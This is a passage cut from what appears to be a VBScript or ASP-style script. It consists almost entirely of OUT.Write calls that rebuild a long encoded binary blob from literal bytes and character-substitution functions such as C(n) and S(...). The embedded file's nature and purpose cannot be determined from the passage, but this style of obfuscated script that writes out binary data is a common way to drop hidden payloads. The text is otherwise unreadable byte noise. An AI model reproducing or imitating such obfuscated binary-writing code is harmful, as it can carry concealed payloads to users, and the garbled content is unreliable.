*ȅV&~."&C(3)&"H,h"&C(12)&"?2"&O&"2%i6"&C(25)&"s"&O&":"&C(2)&""&C(2)&""&S(C(25),3)&C(14)&C(2)&C(34)&C(2)&"6"&C(2)&"39i?\hn{"&C(2)&C(8)&"ʸ"&C(20)&""&C(10)&C(15)&C(24)&"=6[yr?ǜ/N#^66="&C(22)&"mMLKJ@?\`"&C(19)&"J"&C(30)&"~"&O&","&C(8)&"ۺ"&C(21)&")*"&C(17)&"6Yl)"&C(18)&"F]=|"&C(31)&C(30)&"];ox$"&C(27)&"kdQ"&C(10)&""&C(39)&C(11)&C(16)&C(25)&"ywY"&C(26)&"6"&O&"f>r"&C(8)&""&C(11)&"q"&C(28)&"ݢ1\"&C(2)&"q"&S(C(24),2)&"^ףӯjr"&C(24)&""&C(24)&"AO"&C(18)&"0"&C(24)&">O"&C(18)&""&C(16)&"7S|qt"&C(13)&""&C(5)&"x6_Hn׵ھth?>"&C(21)&"(@"&C(18)&"sm"&C(5)&"d"&C(15)&"*\ N_"&C(1)&"<7ѵ1!U?"&C(5)&C(3)&""&C(31)&":n"&C(24)&"#/c5}̱q"&C(26)&""&C(20)&"j"&C(10)&""&C(6)&"۸"&C(11)&""&C(14)&C(28)&""&C(25)&"R6hTi"&C(28)&"~}X"&C(16)&"6z"&C(21)&"xH"&C(15)&""&C(25)&"Ox"&C(28)&C(15)&">"&C(2)&"a~2"&C(5)&"(`׵a"&C(16)&"$Xhd{"&C(18)&"uy"&C(39)&"$\x<?&R"&C(29)&C(34)&""&C(14)&C(9)&C(14)&"#3V"&C(30)&"&Bk"&C(11)&"r8V݀"&C(31)&"N#x6*D>b"&C(20)&C(30)&"2w"&C(39)&C(34)&C(24)&C(16)&""&C(29)&"P$L&͊{v22S"&C(24)&"*n/"&C(23)&"A?y\j>"&C(13)&C(1)&"2}r2*\"&C(24)&"@ "&C(34)&C(19)&C(7)&"U]&qh"&C(12)&"~K"&C(28)&"9$E"&C(15)&"j"&C(39)&"ÒtXu3"&C(9)&"·֚"&C(30)&C(10)&"6JS}"&C(19)&"69"&C(39)&""&C(20)&"={"&C(21)&"Hx"&C(24)&C(30)&"4i"&C(26)&"x"&C(18)&":O*0j}+6B:"&C(23)&"&̿"&C(39)&"+b.ػ&"&C(30)&"{+B"&C(22)&""&C(14)&""&C(8)&"M>"&C(23)&C(10)&"<B$U)G"&C(4)&"D-w"&C(19)&""&C(22)&"9/z(忖"&C(21)&"V5"&C(8)&"d/{4"&C(31)&"x6 :N M{"&C(1)&"")
OUT.Write("I־"&C(39)&"6\"&C(6)&"pNbUΛ"&C(10)&"$:O"&C(13)&"ܹh"&C(12)&"&"&C(11)&"dC˯"&C(34)&"r"&C(2)&"`ݖ3it"&C(23)&"8."&C(29)&"Bʋc"&C(2)&":"&C(1)&")d"&C(2)&"b`\"&C(13)&"{z"&C(19)&C(16)&"κ"&C(34)&"@"&C(31)&"^0Ӻ"&C(19)&"2@[>&Cbeig"&C(7)&"br0"&C(5)&C(28)&""&C(9)&C(24)&"B 6W"&C(1)&C(5)&"Ű"&C(5)&"ؒ"&C(23)&";Aň_"&C(39)&""&C(28)&"$"&C(28)&"ֹֻrͣ"&C(13)&"+ި"&C(14)&";"&C(39)&""&C(11)&""&C(10)&"=À"&C(6)&"&"&C(23)&""&C(1)&"<"&C(39)&"gRW8L=^3B"&C(24)&"&6g"&C(15)&C(11)&""&C(8)&"@?W^Vj6"&C(30)&""&C(2)&"ybUcUZhny"&C(30)&C(14)&"+"&C(30)&"Z9Wc&"&C(29)&">"&C(39)&"($S >),M"&C(31)&"B,w"&C(39)&"!r^"&C(14)&"Ce"&C(21)&C(11)&"?d]i6:U֋:"&O&"M"&C(31)&"r6Db^"&C(2)&C(25)&"0?LM"&O&"V{>E"&C(29)&"z`@1"&C(31)&"ds/"&C(18)&"b+]"&C(29)&"9"&C(11)&"zAK?g"&C(39)&"a>Uzi="&C(4)&"|̭=?#fs"&C(14)&"B%=;"&C(29)&"E4y"&C(30)&C(11)&"ĉ۵>"&C(39)&"B"&C(18)&"N"&C(30)&"@B"&C(39)&"."&C(16)&"+NFRS"&C(25)&"BdJ"&C(22)&"*"&C(34)&"Um"&C(28)&"S{5e<>m>"&C(11)&"՚/Boa;6??3P"&C(3)&"3"&C(1)&C(31)&""&C(26)&"g("&C(30)&"V{h*ż"&C(2)&""&C(1)&"h"&C(11)&">"&C(39)&"pJ"&C(39)&C(21)&"1"&C(25)&"e#d*Dx"&C(31)&"&"&C(30)&""&O&"->3M7ʾ"&C(20)&"CuK"&C(39)&"."&C(28)&"SR5"&C(9)&"N"&C(3)&"ȡ"&C(3)&""&C(28)&"}}w)"&C(18)&"{>s>"&C(28)&"睻dt"&C(19)&"?ϝL"&C(39)&"=o-"&C(9)&"BNOFM:{"&C(25)&"e"&C(9)&"N"&C(39)&"S;"&C(2)&C(6)&"J^"&C(14)&"O&t"&C(31)&C(9)&"K"&C(28)&"=:"&C(15)&"bN}A0R"&C(12)&C(30)&""&C(15)&"<z"&C(34)&"V"&C(26)&"2n."&C(39)&""&C(2)&"԰"&C(13)&":"&C(15)&"2/"&C(12)&""&C(19)&"WΨ"&C(8)&"٬&:rЉ9kd"&C(25)&"QԺ5oc"&C(21)&""&C(22)&""&C(30)&""&C(29)&":~{u@O<"&C(4)&C(11)&C(24)&"P:*cbf_"&C(5)&"dB&ܵ|6&M"&C(19)&"r"&C(18)&"Zd"&C(30)&"HYC"&C(39)&C(34)&"i^d"&C(20)&"ӕfn"&C(1)&"{TD#Ʀc"&C(19)&"?F"&C(24)&"(вCj&7"&C(34)&"QOdϿf"&C(39)&"Mд w>jOp;3JNk"&C(12)&"pѸ4mxJ"&C(39)&"Ŀ08;㯼~"&C(10)&"PIx~vኹl.Z"&C(3)&"v&"&C(2)&""&C(14)&"-U*yM_"&C(18)&""&C(17)&"s"&C(31)&"s|澾"&C(9)&":߷kf"&C(11)&"¶#"&C(12)&"PEjA"&C(20)&""&C(3)&"El"&C(29)&"t"&C(7)&"v"&C(12)&"!"&O&"Vlxʒ"&C(22)&"b\v"&C(15)&""&C(23)&"w"&C(4)&"eͳcV4rGdGpSt$t"&C(26)&C(21)&"n{"&C(12)&"ou&]"&C(2)&"42v"&C(34)&C(21)&"Ӝ"&C(30)&";2?06"&C(30)&""&C(30)&"4"&C(34)&"U"&C(22)&"b"&C(18)&"\C"&C(12)&"$"&C(30)&C(23)&"$"&C(26)&""&C(26)&""&C(2)&"tzj"&C(39)&C(25)&"*"&C(10)&"4"&C(34)&"@"&C(13)&"׎.:B2?"&C(16)&"~R7V^DuG"&C(6)&"="&C(24)&"q"&C(39)&"-=b"&C(10)&"un="&C(18)&""&C(26)&"Үp "&C(3)&"u02q"&C(18)&"}p"&C(4)&"r"&C(13)&"RSU"&C(18)&"h"&C(26)&"JZx4XQ2"&C(18)&"e`jW"&C(27)&"3;3¼4"&C(20)&"`&"&C(18)&"] "&C(14)&"eA5<7s"&C(39)&"kg,e ntj}euZxpo^Twemf6"&C(17)&"(b<"&C(39)&"\ţ"&C(6)&C(28)&"J_3"&C(2)&"D.4P"&C(28)&C(2)&O&"V}hg;WB=?6zՍy"&C(20)&"+;#pt"&C(30)&C(21)&"̂"&C(2)&C(13)&"("&C(15)&"p"&C(14)&",:"&C(6)&"4\"&C(2)&"fۂ.pm"&C(19)&""&O&"U82{"&C(15)&"ZS֢9!"&C(1)&"E"&C(15)&"1("&C(23)&"=e"&C(2)&"s<f4W/qι&"&C(20)&"qcӹ$="&C(13)&"s"&C(25)&"/ھ嵢tS#hƺ"&C(7)&""&C(16)&"$S5/6"&C(11)&"%"&O&"Wܽٶ/"&C(5)&C(13)&""&C(15)&""&C(25)&":A&1E/z"&C(9)&C(3)&"txpq[D"&C(39)&"&"&C(6)&""&C(1)&"u^2"&C(24)&C(11)&""&C(11)&":r̮S:"&C(19)&"/rӽm"&C(9)&C(28)&C(3)&"R"&C(13)&"ZHZ~est"&C(11)&C(14)&"G"&C(4)&C(2)&":v@"&C(6)&"#l"&C(20)&"dy>v"&C(10)&"t"&C(13)&""&C(14)&C(19)&C(14)&"ꛝ"&C(3)&"hh#x8=gz(H캂"&C(39)&C(4)&"t*"&C(5)&""&C(28)&""&C(16)&"@"&C(24)&"N"&C(8)&C(2)&"-U"&C(2)&""&C(10)&"k"&C(17)&"x"&C(10)&S(C(11),2)&""&C(2)&"=e"&C(9)&"2sO}ŴыV&"&C(27)&"-!"&C(19)&"=5(1؏"&C(17)&""&C(22)&C(30)&"Cr0"&C(28)&""&C(16)&"˻Z]N2KǞ"&C(28)&C(4)&"@м*"&C(28)&">"&C(39)&"sk۱"&C(19)&C(10)&C(18)&""&C(20)&"U"&O&"Ji̍s,Z"&C(11)&C(3)&""&C(31)&C(20)&"в"&C(22)&"Y"&C(39)&"q"&C(11)&C(30)&"(%"&C(25)&"xj"&C(39)&"Dp"&C(26)&"k"&C(39)&""&C(30)&"K"&C(9)&"NמlrZLmRr"&C(22)&"u0J^"&C(39)&""&C(3)&"WrbNI"&C(28)&""&C(5)&"Ij&pF"&C(8)&"p"&C(34)&"US𳡩"&C(7)&"B"&C(24)&"*"&C(39)&"ᮮif"&C(8)&""&C(10)&"2"&C(16)&""&C(29)&"&"&C(30)&"4"&C(20)&""&C(20)&""&O&"w.dhS{PZ"&C(39)&O&"cb"&C(26)&"L2TЇsЌ"&C(24)&"P"&C(8)&C(30)&"5Cv7"&C(22)&"m"&C(39)&C(1)&"B"&C(39)&"ۅ"&C(18)&"U"&C(29)&"7"&C(11)&O&C(10)&"n2zi4U"&C(31)&""&C(12)&"9"&C(30)&"Ovؿ^A"&C(3)&"!"&C(2)&"<"&C(20)&"xz]1"&C(22)&C(11)&"D"&C(11)&"EE$~"&C(1)&"~s%$"&C(11)&C(13)&"^"&C(22)&"h<"&C(12)&"&mQ"&C(11)&"+D"&C(23)&"v~"&C(28)&C(10)&"}I"&C(22)&"a"&C(12)&C(3)&O&""&C(13)&""&C(26)&""&C(28)&""&C(19)&"d"&C(12)&">D"&C(7)&"*s@@5$"&C(39)&"N"&C(13)&"P"&C(18)&""&C(39)&"Í6."&C(25)&"M26&!> z[ [smӛ"&C(25)&"+"&C(15)&"p|S"&C(10)&"ZJ"&C(3)&"Hń"&C(3)&"c2ŀR:`*~"&C(26)&"("&C(10)&"ƨ"&C(26)&"VH"&C(19)&"rR>"&C(10)&"QB"&C(23)&"*_,"&C(39)&"D:{"&C(22)&"[uO"&C(11)&"8"&C(24)&"T"&C(21)&"ſ]3d$[,ZGrz"&C(18)&"$"&C(22)&" 4(Ud"&C(11)&""&C(11)&"C"&C(17)&""&C(39)&"Ր"&C(16)&"z"&C(30)&"?g=I)Ȗ\"&C(8)&"^Sψ20S%"&C(30)&"譿;7"&C(19)&C(13)&C(22)&C(19)&";?"&C(10)&";g"&C(15)&"9B*t3"&C(39)&C(27)&C(17)&""&C(20)&"&"&C(21)&"2B"&C(13)&":Zز^"&C(1)&""&C(26)&"N"&C(18)&C(7)&"7_"&C(34)&"ȯ"&C(24)&C(11)&""&C(28)&"Os"&C(5)&C(10)&""&C(13)&"ăILwкfc$MV"&C(10)&",<R"&C(4)&""&C(8)&"A"&C(10)&"pw\*]vj!]}"&C(9)&"TCV"&C(6)&".h=Z=NT&Ѻ}z"&C(17)&""&C(12)&":K-7Vj")
OUT.Write(""&C(20)&""&C(27)&"k"&C(18)&"Ti&"&C(8)&"]S5"&C(34)&"!"&C(26)&"A0⿀xg027s.FZ"&C(17)&";-)Y"&C(26)&"):"&C(10)&"V"&C(8)&C(13)&""&C(10)&"녽Gl@"&C(5)&"x"&C(6)&""&C(34)&"sJ"&C(24)&"xU"&C(13)&""&C(6)&"Sf6"&C(17)&"E&"&C(13)&"v"&C(26)&"ci:"&C(24)&""&C(31)&C(39)&";"&C(12)&C(6)&"50 "&C(39)&"(xqa"&C(26)&"*;q{yMjz05)΁^Ea"&C(14)&"w~@Ac"&C(28)&"oUt1H5ћ=|I3"&C(7)&C(34)&"=]%"&C(29)&"8lkڌ"&C(24)&"WV"&C(24)&"70"&C(28)&""&C(7)&O&"zM"&C(6)&"/w"&C(26)&"y"&C(13)&C(11)&"};7."&C(13)&C(11)&""&C(11)&"xVM6"&C(25)&"ײ3"&C(12)&"q˖?XDC2"&C(14)&""&C(7)&C(18)&""&C(14)&"{2>3"&C(12)&"O"&C(12)&"|N[h"&C(26)&C(7)&C(14)&""&C(34)&C(2)&"Yȇ"&C(1)&"B"&C(3)&"Z"&C(29)&""&C(3)&"]"&C(23)&"ܾCÍ"&C(24)&C(15)&C(12)&"5u$t"&C(14)&"^4="&C(15)&""&C(8)&C(24)&"3"&C(2)&"M["&C(9)&"Ahu"&C(7)&"틃?o3"&C(14)&""&C(24)&"5"&C(22)&"0$7![h"&C(27)&"2/Ʒ"&C(21)&"gJ= bt"&C(19)&"2{Cβb"&C(17)&"Φ&/"&C(24)&""&C(22)&C(17)&"h~g"&C(23)&"A"&C(30)&"\"&C(31)&"O=:"&C(30)&C(17)&"yWĲa3,~"&C(24)&"; "&C(5)&""&C(8)&"x0١5x?"&C(9)&C(8)&""&C(18)&" "&C(9)&"q^kt&"&C(14)&"zò3eC"&C(10)&""&C(27)&"9#"&C(31)&"8"&C(19)&""&C(18)&C(27)&"lN,"&C(12)&""&C(27)&""&C(8)&C(11)&":6ي&%N"&C(15)&"5"&C(34)&"3Gl1h1v=<:ݚž0"&C(18)&"ZK}V"&C(10)&"U"&C(18)&"BZ^"&C(5)&C(25)&"ZXS!nLe.ԳRK"&C(14)&"%r"&C(11)&""&C(2)&C(17)&"W?"&C(9)&"0"&C(24)&"T"&C(9)&"2"&C(25)&"x"&C(28)&"pDO"&C(34)&"Rz/>(䍨[PUs]<8?p"&C(5)&""&C(39)&"hm5K"&C(34)&","&C(30)&"Ȼ"&C(26)&C(24)&"K賡x.!p"&C(39)&"f2"&C(9)&"DUMK"&C(11)&"U"&C(19)&"=<{"&C(14)&"u9"&C(9)&"LަlqxV3zf(<¡"&C(22)&"$OFy"&C(2)&S(C(30),2)&"9o"&C(16)&"]R*ν"&C(30)&""&C(29)&"&%4Q)"&C(39)&"ć&"&C(19)&"&"&C(10)&"bP"&C(30)&" A"&C(39)&"k&2R-"&C(2)&" cpT@<"&C(19)&"Ƴ49-P4:ib~"&C(5)&"{h"&C(15)&"XbMWz4"&C(39)&""&C(8)&"W)"&C(5)&"5?zXu7]ShW{h"&C(24)&"j&"&C(9)&"4"&C(2)&"Vn&mڽ"&C(2)&"-Ƚ^YzuMQɻ>.!"&C(8)&"V"&C(19)&"ҷqs"&C(22)&"%"&C(28)&""&C(26)&"#"&C(39)&"ލg"&C(6)&"ǚ(MX-edb-"&C(34)&"q"&C(19)&"fZ$c&K="&C(1)&"^6>"&C(15)&C(18)&"O"&C(9)&"t"&C(5)&"iņc=/iHƞ)1="&C(13)&"x!G/;"&C(39)&"=4x*"&C(30)&""&C(28)&"2Zmfk^V"&C(30)&""&C(31)&"k"&C(24)&"b/dfj0dnr;"&C(15)&"vzx~е47j"&C(39)&""&C(8)&"b"&C(9)&"r"&C(8)&C(3)&"q"&C(30)&";"&C(18)&""&C(39)&"OR[xS߮&P&b`"&C(7)&""&C(9)&""&C(9)&"Ǳ"&C(26)&"Ҳ~"&C(39)&""&C(17)&"-aT6Pk"&C(12)&"j"&C(6)&"S݌&"&C(11)&"3"&C(9)&"&W15u<a"&C(15)&C(4)&"u="&C(7)&"sri37tƑs!"&C(26)&C(30)&"#?5rhM"&C(19)&"۷2"&C(24)&"<="&C(39)&C(3)&"q;"&C(24)&";3s"&C(3)&"7u;y("&C(30)&"l6:>>BF"&C(13)&"6"&C(10)&"pJ;"&C(7)&"NRx"&C(11)&"R"&C(11)&""&C(7)&C(39)&"h"&C(29)&"|h"&C(9)&"TǮڏ"&C(19)&"T&=ŭ*fnpt>"&C(26)&""&C(39)&C(16)&"}4vp"&C(2)&"FxC"&C(17)&"M/<"&C(30)&"d~"&C(24)&"r"&C(6)&"$KT"&C(4)&"%"&C(30)&"pE#`NTBQ=Ņe{("&C(2)&""&C(18)&"s"&C(39)&C(9)&"s."&C(29)&"Lxrƥ#&"&C(4)&C(2)&"R8"&C(30)&"y"&C(8)&"&&;"&C(9)&C(3)&",e,"&C(5)&":qbo⌝+13"&S(C(22),2)&""&C(9)&"?ă"&C(2)&"L{s["&C(34)&"V4%;%8a/:"&C(7)&"%Dݣ51%?,c5kj"&C(20)&C(5)&"%<("&C(13)&C(39)&""&C(6)&"|(&7 $׾ε!.<܂:)*S"&C(9)&"%Y<Ǭ:$<܃<"&C(34)&C(31)&C(29)&"Ƶ;G4"&C(5)&"u4"&C(29)&"\<`"&O&"ȃ97rj"&C(39)&"!36Lp?/N"&C(12)&"U"&O&"U.`/?õ}"&O&"b?"&C(34)&"Yҟ"&C(28)&"w="&C(19)&C(24)&"]Hlf\%"&S(C(30),2)&"$"&C(34)&"W``"&C(7)&"U .Zp"&C(15)&"f9"&C(15)&""&C(25)&"b~q:(?ųjc1"&C(27)&""&C(18)&"-)F5"&C(1)&"<"&C(1)&"c UfrC"&C(7)&"sT)7"&C(27)&"ls"&C(12)&"ZC8F"&C(31)&"4"&C(12)&"f"&C(18)&"/b7_v;21jL<?#"&C(22)&"<<|VH"&C(22)&""&C(22)&":"&C(39)&"0E{&"&C(28)&C(18)&C(8)&"{{E"&C(34)&""&C(1)&"<"&C(39)&""&S(C(1),2)&""&C(29)&"dMݤ"&O&"A"&C(39)&"v"&C(12)&"!rgg"&C(39)&"UЖ5i8k"&C(12)&"4L%>*!7"&O&"ߒ2"&C(23)&":y7{i"&C(30)&"Z&F?*;35"&C(26)&"="&C(12)&""&C(17)&"r<"&C(7)&"2"&C(11)&""&C(5)&"ki!"&C(16)&"2|"&C(24)&":  3rI"&C(13)&C(5)&"&Omz"&C(2)&"KH"&C(8)&"뭊;8Ŏ"&C(8)&";3 %O/"&C(31)&C(6)&"~/>"&C(24)&"sk9"&C(27)&"/zm"&C(28)&C(14)&"(:s:3w"&C(10)&"ړwŸx"&C(18)&"[r3j+0B"&C(28)&"&~"&C(39)&"q"&C(14)&""&C(11)&""&C(3)&"k7sjSz`~"&C(18)&""&C(10)&"}jh=u"&C(28)&C(11)&"V"&C(18)&"]o,"&C(28)&"e"&C(20)&C(6)&"iz$cT4g5"&C(21)&""&C(8)&":"&C(8)&"B"&C(11)&"t"&C(27)&"TN"&C(11)&"h?"&C(19)&"r+"&C(18)&"O<*~"&C(12)&"ϯh 8K"&C(8)&""&O&""&C(18)&C(9)&"v"&C(5)&C(8)&">"&C(28)&""&C(3)&""&C(3)&"A"&C(28)&"t͊"&C(26)&"h"&C(21)&C(6)&""&C(2)&"* D̼]Yaᆚl5."&C(22)&""&C(4)&")>5*"&C(22)&"P"&C(15)&"7?p"&C(18)&"$µu"&C(24)&""&C(31)&"RiŌ"&C(31)&"="&C(7)&"7&"&C(10)&":NhX~uii)"&C(34)&"F*T0_"&C(10)&"b=-=<6&_1]e<"&C(12)&"󝣴rh"&O&"&ǎm߳8XO.{1NL&>"&S(C(7),2)&"iZ"&C(2)&"ʊ+"&C(20)&"_;vƗa"&C(30)&""&C(26)&C(20)&"2"&C(7)&"AN"&C(2)&"="&C(25)&"]{"&C(27)&"m"&C(3)&"Vr"&C(9)&"ԨK7"&C(5)&""&C(4)&""&C(3)&"{Ln"&C(17)&""&C(9)&"ø"&C(28)&"ׇ"&C(3)&"e"&C(17)&"koʾխ"&C(17)&C(8)&"R&"&C(28)&"S"&C(23)&C(17)&C(13)&""&C(28)&""&C(9)&"N"&C(13)&""&C(30)&"N")
OUT.Write(C(34)&""&C(13)&"آ8$ݫ9"&C(24)&"vR~"&C(20)&C(2)&""&C(39)&""&C(28)&")"&C(4)&"M"&C(18)&""&C(3)&"u"&C(5)&"^"&C(31)&"vU<X%"&C(20)&"0"&C(18)&C(8)&"]=vTӆ*aB"&C(30)&"n/rz<:\`:"&C(18)&C(6)&"Q7>V:T\"&C(18)&"M\=6GW"&C(24)&"<=dY"&C(18)&"2|nm"&C(8)&C(31)&"cZҼn8w="&C(22)&"lҿDM"&C(5)&""&C(5)&"@"&C(22)&""&C(10)&"+?"&C(2)&"o)B2;܈Hv"&C(19)&"?R_]XZ4"&C(30)&"rT2C"&C(39)&"N=Ҵh/"&C(39)&""&C(6)&""&C(39)&"cn~7ʈ7D~rwc>T/?k7g<"&C(23)&""&C(6)&"8KI?X"&C(15)&"v9JkC棁"&C(10)&""&C(34)&""&C(39)&"n5z|Z:"&C(24)&"^RV:"&C(10)&"S"&C(26)&"p#"&C(30)&"W8"&C(2)&"."&C(27)&""&C(23)&"("&C(27)&"r"&C(11)&"k("&C(5)&""&C(28)&"xu"&C(8)&"&"&C(24)&")gtO$"&C(3)&"09Z"&C(3)&"v\R{"&C(26)&""&C(17)&C(10)&C(19)&"Hxy"&C(23)&"f^v="&C(14)&"ھѧʂi["&C(14)&"${"&C(23)&"zn${Ib"&C(21)&"CE"&C(14)&"VZ8ZO7HR  A*GE"&C(18)&">^6"&C(8)&C(13)&"b"&C(2)&"_>UMFB[&"&C(1)&"7"&C(12)&"("&C(16)&"ʉt:_ZC4"&C(5)&""&C(13)&""&C(12)&"3"&C(30)&""&C(16)&"cP*Z"&C(9)&C(5)&"cy"&O&"I"&C(4)&""&C(2)&"D}P!kҾkDƶ~cLB."&C(24)&"i탽`8"&C(6)&"78v"&C(16)&"7"&C(39)&"A){ʐ"&C(22)&"z"&S(C(9),4)&"e8"&C(15)&"$BHc7|œ"&C(19)&C(20)&C(24)&"|Q"&C(9)&""&C(16)&""&C(34)&""&C(13)&"-"&C(10)&C(9)&"72A&+w"&C(4)&"-\1 8:6"&C(22)&"{)4uXD<*S:F➀$"&C(17)&"j/=[F<>"&C(13)&"έ?fµBzc m"&C(29)&"3سN?>Mc::$v#Tw(*52|JMoժ"&C(6)&"<"&C(2)&""&C(30)&""&C(15)&"Պ=G"&C(16)&C(28)&"^"&C(31)&""&C(24)&":|-"&C(26)&"w<"&C(13)&C(39)&"`i"&C(12)&"z"&C(6)&"ʴ"&C(7)&C(14)&"M䃝qºijg7!$C7k־("&C(12)&"U<"&C(6)&"s"&C(39)&"𼲞$UŲ֩*iZ^Ѳ5]d"&C(26)&":C"&C(26)&"?ʲ"&C(31)&"-"&C(28)&"gQ@R^D^,辻ȿg="&O&""&C(7)&"=3Qx1;"&C(10)&""&C(29)&C(27)&"??"&C(2)&"Z"&C(21)&C(13)&"u"&C(7)&"8Ͱ!"&C(24)&"=="&C(24)&"3"&C(24)&"F"&C(39)&"3!&"&C(5)&"B/U&_G"&C(1)&"؜"&C(7)&"x"&C(18)&"` yM5"&C(31)&"P$i"&C(34)&"J`KIFBֲb"&C(3)&"= h"&C(28)&"lgeQ*Ċ"&C(5)&"]\^"&C(28)&""&C(24)&"W"&C(5)&">?M1*"&C(7)&"кki7z"&C(18)&C(23)&""&C(2)&"_T"&C(20)&"n"&C(13)&""&C(6)&"U5r"&C(2)&C(24)&"U"&C(22)&"hEɐ"&C(16)&"&5ϵbur:JN2"&C(23)&"&<٬6ZC"&C(3)&"鸃DB-"&C(11)&""&C(39)&C(11)&"5i"&C(22)&"j"&C(9)&""&C(8)&"-uLȰ"&C(21)&"A2"&C(14)&"{T"&C(2)&"A23"&C(23)&"y$."&O&"QҨ"&C(3)&"$"&C(1)&"zpI:2(ӵy=©!"&C(31)&""&C(28)&"r"&C(7)&"U5s"&C(39)&""&C(14)&")("&C(8)&C(12)&"S"&C(24)&"E"&C(2)&C(3)&" ^"&C(2)&"bVŒ"&O&"rw(_"&C(5)&"&͢"&C(18)&"q4S)>"&C(29)&"4"&C(24)&"bκ"&C(22)&"O4h"&C(5)&"i"&S(C(11),2)&"x+ĳf"&C(25)&"4"&C(11)&"6<g*"&C(3)&C(12)&"0꺹5A=q"&C(2)&"69"&C(9)&C(8)&"R2y"&C(30)&"6Beՙ"&C(10)&"2$D9b`fc"&C(17)&C(22)&"8"&C(39)&"F"&C(5)&"!"&C(24)&"Swʵ"&C(5)&"0"&C(21)&"9lQ:KpxgF>þg߹"&C(26)&""&C(13)&"lݰ?9ժ6)gwݐr&"&C(24)&"8 &-"&C(31)&"h]A쾝u/3uFx0t?b:5u"&C(8)&"Wi-њ3y"&C(9)&"Jg\xHk@ҺO"&C(13)&""&C(21)&"{[jը"&C(9)&">%q"&C(19)&C(8)&"5g"&C(2)&"&b"&C(11)&C(4)&"6Ǟն.Y"&C(34)&C(28)&""&C(29)&"rN&"&C(10)&C(21)&"IJ"&C(20)&"uxc!"&C(30)&"I"&C(12)&"s477"&C(29)&"Z7"&C(5)&"f^OS݌"&C(21)&"*!6&"&C(1)&C(30)&"п"&C(30)&""&C(6)&"HBP6N"&C(15)&"}"&C(39)&""&C(26)&"n"&C(24)&"R"&C(2)&"&ʏZ}H"&C(5)&">"&C(30)&"4>DB6v"&C(34)&""&C(39)&"ȵk^⽭4-"&C(6)&""&C(39)&"S"&C(25)&C(19)&C(8)&""&C(34)&"50mkǆf"&C(21)&"0|T"&C(7)&"T"&C(11)&"§x"&C(9)&"F;B7YT"&C(7)&"|"&C(22)&C(15)&"v"&C(7)&"^"&C(34)&"7"&C(29)&"NK;"&C(9)&C(17)&"p3u026-Cz..Z$"&C(5)&"y&"&C(3)&""&C(18)&"ߜ6"&C(22)&C(27)&""&C(28)&"4< 8Ї"&C(21)&"}.?5"&C(15)&C(18)&"H"&C(22)&""&C(5)&"VD!"&C(15)&""&C(5)&"ܞ"&C(29)&"v(*2j"&C(23)&"I4j8$D"&C(18)&"_"&C(9)&"^"&C(39)&C(21)&"."&C(5)&C(7)&C(28)&""&C(18)&"0"&C(5)&"1b"&C(24)&C(22)&"$"&C(26)&"=7&"&C(7)&"3&r"&C(28)&""&C(39)&C(30)&"h"&C(8)&"θu"&C(29)&"z8"&C(27)&C(8)&"EXq"&C(12)&"ee"&C(34)&"F"&C(26)&C(14)&"r3"&C(8)&", "&C(15)&C(13)&"tHQPX"&C(18)&""&C(8)&"&"&C(14)&"8"&C(12)&"L/˒R"&C(28)&"C"&C(14)&"Yfp69ޒ"&C(26)&".n*"&C(30)&C(10)&"1M"&C(31)&"K"&C(13)&"s"&C(24)&"1(מ?Og"&C(24)&";U"&C(29)&C(2)&"tp:u5"&C(25)&"b8"&C(9)&"6s<:}.1<Z!N!"&C(10)&".j#&"&C(26)&""&C(39)&"y"&C(39)&",5û&"&C(34)&"H"&C(28)&"*"&C(27)&"&"&C(21)&C(27)&";3R/"&C(5)&"i"&C(25)&"S&&-h"&C(30)&"VWP޾TֹU´)V"&C(26)&""&C(19)&""&C(29)&""&C(26)&"nvI*ux-x"&C(16)&"/2"&C(18)&""&C(8)&"~"&C(12)&":"&C(16)&""&C(18)&"7#5*"&C(20)&C(10)&""&C(30)&"ߨ$j_"&C(3)&"-"&C(31)&"Тvj"&C(6)&":"&C(9)&C(22)&C(10)&""&C(26)&"l@0˻I\˂3K=xQ"&C(10)&"H&"&C(14)&"Ro9/ΝUo"&C(5)&"ԭ"&C(16)&"xê"&C(8)&"5 "&C(1)&"!^1o{"&C(6)&"&C"&C(30)&""&C(28)&"Ǧ"&C(30)&"SX"&C(2)&"m"&C(2)&"ă9_UJr"&C(5)&" >"&C(28)&"4."&C(5)&";L%Vy"&C(16)&"cE"&C(31)&""&C(2)&"{"&C(17)&"s"&C(10)&"ɲ"&C(25)&"P~a&:5<"&C(18)&"]DyL=$9"&C(26)&","&C(22)&"L9j"&C(3)&"@q"&C(15)&"OgcLt"&C(14)&"X$36JY:y>Kh"&C(23)&C(11)&"hBFNRVZt$"&C(11)&"^b"&C(5)&"VRMO"&C(17)&"^"&C(12)&""&C(18)&"-"&C(2)&C(21)&"&ԡw"&C(28)&"cf"&C(27)&"T:"&C(15)&"~TQ5/"&C(18)&"!4@usv^="&C(14)&"4/A$"&C(19)&">"&C(39)&""&C(28)&"!RRF"&C(6)&"{"&C(10)&"^c"&C(21)&"څ"&C(10)&"x8"&C(39)&""&C(31)&""&C(12)&""&C(23)&"l/_ޝǼ!"&C(24)&"9pg<"&C(2)&"h"&C(34)&"Ćq;="&C(2)&"3f"&C(39)&""&C(9)&"Oc#2결H"&C(10)&"s"&C(4)&C(34)&"J4KuSF"&C(20)&">h"&C(31)&"XP[=^R"&C(22)&"H<")
OUT.Write("5síƲuؙ͞}LT+׸;1*"&C(39)&""&C(5)&C(28)&""&C(28)&"*U"&C(13)&"4"&C(34)&"<T91="&C(34)&"η"&C(5)&"IrTޑҹ"&C(27)&""&C(28)&"ϓƍ"&C(2)&""&C(15)&C(39)&"bEWc"&C(26)&"%"&C(30)&""&C(30)&"zM"&C(39)&"^hǶ)̛"&C(29)&C(3)&"j"&C(13)&"<"&C(7)&"v3"&C(7)&":Ps"&C(12)&"n7p"&C(9)&"v"&C(14)&"]o?Of.>"&C(7)&C(4)&"S"&C(22)&"8TL"&C(9)&"v>"&C(2)&"ʂlV4c,"&C(19)&""&C(13)&C(15)&C(11)&"r"&O&""&C(6)&"."&C(27)&"*>"&C(20)&"2"&C(3)&""&C(30)&"qU{@"&C(34)&"~jR2l2&u2*9&"&C(15)&""&C(2)&"5"&C(2)&"Tnwhr=>St"&C(28)&"?1"&C(29)&""&C(8)&""&C(22)&"=>i"&C(39)&"&l"&C(30)&"1<2<$("&C(24)&"jqc"&C(23)&"¸"&C(3)&"f="&C(10)&"p(&TZA]p"&C(22)&"^2m]&ÈI>nVWh"&C(17)&" 